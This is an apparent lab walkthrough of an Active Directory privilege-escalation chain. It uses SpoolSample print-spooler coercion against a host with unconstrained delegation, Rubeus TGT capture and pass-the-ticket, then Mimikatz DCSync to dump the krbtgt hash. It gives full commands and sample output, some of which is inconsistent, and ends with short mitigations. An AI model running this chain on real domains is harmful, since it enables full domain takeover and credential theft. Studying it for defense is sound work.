# Exploiting Unconstrained Delegation with SpoolSample

## 🔍 Overview
This attack exploits **Unconstrained Delegation** in an Active Directory environment to obtain the **TGT of a Domain Controller (DC)** without requiring user interaction. The key component of this technique is the **Print Spooler service vulnerability**, which forces a DC to authenticate to an attacker-controlled machine with Unconstrained Delegation enabled.

---

## 📌 Exploiting the Print Spooler to Capture a DC TGT

### 1️⃣ **Checking if Print Spooler is Enabled on the DC**
Use PowerShell to check if the print spooler service is running on a **Domain Controller (DC)**:
```powershell
PS C:\Tools> dir \\CDC01\pipe\spoolss
```
If the output shows the `spoolss` named pipe, it confirms that the print spooler service is accessible.

---

### 2️⃣ **Using SpoolSample to Force Authentication from the DC**
The **MS-RPRN (Microsoft Print System Remote Protocol)** allows us to **coerce** authentication from a **Domain Controller** (CDC01) to a machine under our control (APPSRV01), which has **Unconstrained Delegation** enabled.

Run **SpoolSample.exe**:
```sh
C:\Tools> SpoolSample.exe CDC01 APPSRV01
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\CDC01, CaptureServer: \\APPSRV01
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```
> ⚠️ **Note:** You may need to run SpoolSample multiple times before it successfully triggers authentication.

---

### 3️⃣ **Monitoring for TGT Capture Using Rubeus**
We use **Rubeus** in monitoring mode to capture the **TGT** from the DC:
```cmd
C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
```
✅ If successful, **Rubeus** will display the captured **TGT** for the **Domain Controller (CDC01$)**:
```
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: TGT Monitoring
[*] Target user     : DC03$
[*] Monitoring every 1 seconds for new TGTs


[*] 3/12/2025 7:12:29 PM UTC - Found new TGT:

  User                  :  DC03$@INFINITY.COM
  StartTime             :  3/12/2025 10:04:21 AM
  EndTime               :  3/12/2025 8:04:12 PM
  RenewTill             :  3/19/2025 10:04:12 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFDDCCBQigAwIBBaEDAgEWooIEFDCCBBBhggQMMIIECKADAgEFoQ4bDElORklOSVRZLkNPTaIhMB+gAwIBAqEYMBYbBmtyYnRndBsMSU5GSU5JVFkuQ09No4IDzDCCA8igAwIBEqEDAgECooIDugSCA7b3sg2GBmbr4u/a40rIvBX87ha3p0bhHayhLTEG5JqQG8W2tmxrjFUYiz5Zsex4PnB+FNs3/6Dyu+ngk9tugsNSlwObbrv53G/+zW7wFCYYHZ80A7AF5dD1rCv6L4m2SJtQxol9CCojbx/uWAJtXNw6A6wFzfrHSrL+aV5zqE0w3S8cXNTQjx3QebMuspH6PpVAf+adpFhTBQx67HB8RWFqdCdkd/iL1m3HAcZwmhhdmq90CJm7OMOOoiZozYNGApJKtolcnSO3dPfvwKQ0Rh+DdpiTAXtm9iQWPmcEoLKxfoN/nFPnCF/egVLl7E9SYKhrEX8rOEsvP9o+1Go6Zl7HPBSZJOEkTxnIsvSMw2mMn8hJEVBKcPrRUkY6UjOw8X+8YMMWHoZ4vr9C8OVVxwOGgW5rJ6qDBslSDmBvsLlsh57gLCrJKSEzEfTOsnJdjsahXqUPBmKhdBR+9cpY1IdJFUI5008GpUoi0WccwTn
```

---

### 4️⃣ **Injecting the TGT into Memory for DC-Level Privileges**
Now that we have the **TGT of the DC**, we inject it into memory using **Rubeus**:
```cmd
C:\Tools> Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
[*] Action: Import Ticket
[+] Ticket successfully imported!
```
---

### 5️⃣ **Performing DCSync to Extract Domain Credentials**
With the **TGT of the DC**, we can use **Mimikatz** to **extract all password hashes from Active Directory**:
```cmd
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```
Sample output:
```
Hash NTLM: 4b6af2bf64714682eeef64f516a08949
```
✅ Now we have the **NTLM hash of the KRBTGT account**, meaning we can generate **Golden Tickets** and take full control of the domain.

---

## 🔥 **Relation to Unconstrained Delegation**
This attack is possible **only because of Unconstrained Delegation**. Here’s why:

- The DC **automatically forwards its TGT** when authenticating to a system with **Unconstrained Delegation**.
- By coercing the DC to authenticate using **SpoolSample**, we **capture its TGT**.
- With **Rubeus**, we **inject the TGT into memory**, allowing us to act as the **Domain Controller**.
- With **DCSync**, we extract **NTLM hashes**, leading to **complete domain compromise**.

---

## 🚀 **Conclusion**
This attack shows how dangerous **Unconstrained Delegation** is. If an attacker compromises a **single** machine with this setting enabled, they can escalate privileges to **Domain Admin** without any user interaction.

📌 **Mitigation Steps**:
- **Disable Unconstrained Delegation** for critical systems like **Domain Controllers**.
- **Disable the Print Spooler service** on **Domain Controllers** if not needed:
  ```powershell
  Stop-Service -Name Spooler -Force
  Set-Service -Name Spooler -StartupType Disabled
  ```
- **Monitor Kerberos authentication logs** for abnormal TGT requests.

---

## 🛠 **Tools Used**
- **SpoolSample**: Exploits **MS-RPRN** to force authentication from a DC.
- **Rubeus**: Captures and injects **TGTs** in memory.
- **Mimikatz**: Performs **DCSync** to dump **NTLM hashes**.


